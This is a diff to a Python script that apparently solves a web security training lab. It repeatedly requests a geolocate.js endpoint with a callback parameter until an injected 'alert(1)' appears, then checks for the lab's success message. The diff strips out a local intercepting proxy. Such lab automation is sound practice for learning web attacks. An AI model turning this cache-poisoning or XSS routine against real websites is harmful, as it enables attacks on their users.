@@ -14,15 +14,15 @@ class LabSolver:
         }
         response = requests.Request('GET', self.lab_url + 'js/geolocate.js?callback=setCountryCookie', data=data)
         prepared_request = response.prepare()
-        response = self.session.send(prepared_request, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.send(prepared_request)
         while True:
             if 'alert(1)' not in response.text:
-                response = self.session.send(prepared_request, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.send(prepared_request)
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
